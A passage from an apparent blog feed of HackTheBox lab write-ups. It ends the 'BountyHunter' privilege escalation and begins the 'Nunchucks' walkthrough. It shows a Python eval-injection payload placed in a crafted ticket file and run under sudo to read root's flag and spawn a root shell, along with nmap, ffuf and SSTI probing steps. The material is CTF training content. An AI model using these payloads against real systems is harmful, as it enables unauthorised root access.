</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User development may run the following commands on bountyhunter:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</span></span></code></pre></div><h4 id="source-analysis">Source Analysis</h4>
<p><code>ticketValidator.py</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#Skytrain Inc Ticket Validation System 0.1</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Do not distribute this file.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">loc</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.md&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Wrong file type.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#Evaluates a ticket to check for ireggularities.</span>
</span></span><span class="line"><span class="cl">    <span class="n">code_line</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="o">.</span><span class="n">readlines</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;# Skytrain Inc&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;## Ticket to &#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Destination: </span><span class="si">{</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">:])</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;__Ticket Code:__&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;+&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#DEBUG print(ticket)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Valid ticket.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Invalid ticket.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span><span class="o">.</span><span class="n">close</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><p>I&rsquo;m bad at python, but I can see where is the goal from that script, it&rsquo;s this line</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span></code></pre></div><p>So the flow is: ask a file -&gt; load the file (markdown extension) -&gt; some unique evaluation -&gt; eval function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Valid ticket.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Invalid ticket.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span><span class="o">.</span><span class="n">close</span>
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>To exploit this script, I can just create a md file, and the first three line are:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl"><span class="gh"># Skytrain Inc
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gu">## Ticket to me
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>__Ticket Code:__
</span></span></code></pre></div><p>Now in the fourth line, I can inject a Python code such as:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">**</span><span class="mi">32</span><span class="o">+</span><span class="mi">0</span><span class="o">==</span><span class="mi">32</span> <span class="ow">and</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat /root/root.txt&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>As long as the number has 4 as the remainder when mod by 7, it can pass these lines and it will be <em>eval</em>-ed and executed as <code>32+0==32 and __import__('os').system('cat /root/root.txt')</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># [&#34;32&#34;, &#34;0==32 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;)&#34;]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;+&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># 32</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span></code></pre></div><blockquote>
<p><code>os.system([command])</code> returns value of 0 if the execution is success.</p>
</blockquote>
<p>The complete file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:/dev/shm$ cat iamf.md
</span></span><span class="line"><span class="cl"><span class="c1"># Skytrain Inc</span>
</span></span><span class="line"><span class="cl"><span class="c1">## Ticket to me</span>
</span></span><span class="line"><span class="cl">__Ticket Code:__
</span></span><span class="line"><span class="cl">**32+0<span class="o">==</span><span class="m">32</span> and __import__<span class="o">(</span><span class="s1">&#39;os&#39;</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">&#39;cat /root/root.txt&#39;</span><span class="o">)</span>
</span></span></code></pre></div><p>Now I can run and supply my ticket file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
</span></span><span class="line"><span class="cl">Please enter the path to the ticket file.
</span></span><span class="line"><span class="cl">iamf.md
</span></span><span class="line"><span class="cl">Destination: me
</span></span><span class="line"><span class="cl">70cfb26382b7af00c95360e142894b1f
</span></span><span class="line"><span class="cl">Invalid ticket.
</span></span></code></pre></div><p>For shell, I can just change the fourth line to execute bash.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">**32+0==32 and <span class="gs">__import__</span>(&#39;os&#39;).system(&#39;/bin/bash&#39;)
</span></span></code></pre></div><p>And done.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
</span></span><span class="line"><span class="cl">Please enter the path to the ticket file.
</span></span><span class="line"><span class="cl">iamf.md
</span></span><span class="line"><span class="cl">Destination: me
</span></span><span class="line"><span class="cl">root@bountyhunter:/dev/shm# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@bountyhunter:/dev/shm# ls -l /root/
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jul <span class="m">30</span> 16:38 root.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Apr  <span class="m">5</span> 22:48 snap
</span></span><span class="line"><span class="cl">root@bountyhunter:/dev/shm#
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Nunchucks</title>
      <link>https://fahmifj.github.io/hackthebox/nunchucks/</link>
      <pubDate>Sun, 07 Nov 2021 01:42:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/nunchucks/</guid>
      <description>SSTI in Nunjucks and SUID capability on Perl</description>
      <content:encoded><![CDATA[<p>Nunchucks features a NodeJS website that uses <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> as its templating engine. Fuzzing for the hostname reveals another website that is vulnerable to SSTI, which can be exploited to gain initial access to the system. Further enumeration reveals that the Perl binary has the <code>cap_setuid</code> capability set, and this eventually allows me to escalate myself to root.</p>
<p>I really enjoyed the foothold part of this box, so that section might be a bit longer.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SSTI on Nunjucks</li>
<li>Creating tplmap middleware using Flask</li>
<li>Exploiting <code>cap_setuid</code> on Perl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Tplmap</li>
<li>Flask</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan with <code>nmap</code> reveals 3 open ports: SSH on its default, HTTP and its secure version, HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.122 nunchucks
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.122 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 22,80,443 -sC -sV -oA nmap/all-tcp-ports-nunchucks 10.10.11.122
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-05 07:12 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.122
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Nunchucks - Landing Page
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-08-30T15:42:24
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-08-28T15:42:24
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-nextprotoneg: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.77 seconds
</span></span></code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="http---https">HTTP -&gt; HTTPS</h3>
<p>For HTTP, nothing interesting in the server response, it has permanent redirection to HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ curl -I http://nunchucks.htb/ 
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">301</span> Moved Permanently
</span></span><span class="line"><span class="cl">Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">05</span> Nov <span class="m">2021</span> 11:51:32 GMT
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">178</span>
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Location: https://nunchucks.htb/
</span></span></code></pre></div><h3 id="nunchuckshtb">nunchucks.htb</h3>
<p>On the HTTPS, it&rsquo;s a company site called Nunchucks that offers online shop creation.</p>
<p><div class="img-container"><img src="imgs/image-20211105185410047.png" alt="image-20211105185410047"  /></div>
</p>
<p>At the bottom of the page, there is an email, also it says it will have a store soon.</p>
<p><div class="img-container"><img src="imgs/image-20211105190058511.png" alt="image-20211105190058511"  /></div>
</p>
<p>Opening Wappalyzer reveals it&rsquo;s using Node.js and PHP. I doubt it&rsquo;s PHP since appending <code>.php</code> gives me a 404 error.</p>
<p><div class="img-container"><img src="imgs/image-20211105185340514.png" alt="image-20211105185340514"  /></div>
</p>
<p>The signup button sends me to <code>/signup</code> where a signup form is shown. I will just signup and intercept the request.</p>
<p><div class="img-container"><img src="imgs/image-20211105185906028.png" alt="image-20211105185906028"  /></div>
</p>
<p>I&rsquo;ll send this request to repeater just in case, and then forward it</p>
<p><div class="img-container"><img src="imgs/image-20211105185921036.png" alt="image-20211105185921036"  /></div>
</p>
<p>But then, the returned response states that registration is closed</p>
<p><div class="img-container"><img src="imgs/image-20211105190014496.png" alt="image-20211105190014496"  /></div>
</p>
<p>I changed the endpoint to <code>/api/login</code>, and it returns the same.</p>
<p><div class="img-container"><img src="imgs/image-20211105190246106.png" alt="image-20211105190246106"  /></div>
</p>
<p>Sending a malformed input breaks the parser and leaks the web directory.</p>
<p><div class="img-container"><img src="imgs/image-20211105190735552.png" alt="image-20211105190735552"  /></div>
</p>
<p>Nothing else to try here.</p>
<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Fuzzing the Host header reveals a subdomain: <code>store.nunchucks.htb</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ ffuf -k -u https://nunchucks.htb -H <span class="s2">&#34;Host: FUZZ.nunchucks.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fl <span class="m">547</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v1.3.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : https://nunchucks.htb
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.nunchucks.htb
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
</span></span><span class="line"><span class="cl"> :: Filter           : Response lines: <span class="m">547</span>
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">store                   <span class="o">[</span>Status: 200, Size: 4028, Words: 1053, Lines: 102<span class="o">]</span>
</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>4989/4989<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">269</span> req/sec :: Duration: <span class="o">[</span>0:00:22<span class="o">]</span> :: Errors: <span class="m">0</span> ::
</span></span></code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 store.nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h3 id="storenunchuckshtb">store.nunchucks.htb</h3>
<p>Store is not available, but I can subscribe for newsletter.</p>
<p><div class="img-container"><img src="imgs/image-20211105191702728.png" alt="image-20211105191702728"  /></div>
</p>
<p>When I submit an email address there, it reflects the address back.</p>
<p><div class="img-container"><img src="imgs/image-20211105191708337.png" alt="image-20211105191708337"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="ssti">SSTI</h3>
<h4 id="identify">Identify</h4>
<p>Since I&rsquo;ve got a spoiler from the machine tags and the machine name, I immediately sent the typical <code>{{7*7}}</code> SSTI payload, and <code>49</code> returned in the email address. This means the site is vulnerable.</p>
<p><div class="img-container"><img src="imgs/image-20211105191824204.png" alt="image-20211105191824204"  /></div>
</p>
<blockquote>
<p>The email validation is on client-side.</p>
</blockquote>
<h4 id="creating-middleware-for-tplmap-with-flask">Creating Middleware for tplmap with Flask</h4>
<p>The machine name gives a big spoiler about which templating engine this machine uses (Nunjucks), and there is a nice writeup that shows how to exploit it <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine.">here</a>. But, I&rsquo;d like to let <code>tplmap</code> identify it for me.</p>
<p>Unfortunately, there is no such option in <code>tplmap</code> for sending a request in JSON format. Therefore, I created a simple middleware using Flask which acts as a middleman/proxy that will takes the non-JSON request and convert it before forwarding the request to <code>store.nunchucks.htb</code>. Here&rsquo;s the code:</p>
<script type="application/javascript" src="https://gist.github.com/fahmifj/fad39893ee4ec8636baba2903aee7814.js"></script>

<blockquote>
<p>If you&rsquo;re having trouble with tplmap, maybe this post <a href="https://fahmifj.github.io/blog/tplmap-install/">here</a> could resolve it.</p>
</blockquote>
<p>I&rsquo;ll run the middleware.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.46»
</span></span><span class="line"><span class="cl">$ python3 middleware.py
</span></span><span class="line"><span class="cl"> * Serving Flask app <span class="s2">&#34;middleware&#34;</span> <span class="o">(</span>lazy loading<span class="o">)</span>
</span></span><span class="line"><span class="cl"> * Environment: production
</span></span><span class="line"><span class="cl">   WARNING: This is a development server. Do not use it in a production deployment.
</span></span><span class="line"><span class="cl">   Use a production WSGI server instead.
</span></span><span class="line"><span class="cl"> * Debug mode: off
</span></span><span class="line"><span class="cl"> * Running on http://0.0.0.0:80/ <span class="o">(</span>Press CTRL+C to quit<span class="o">)</span>
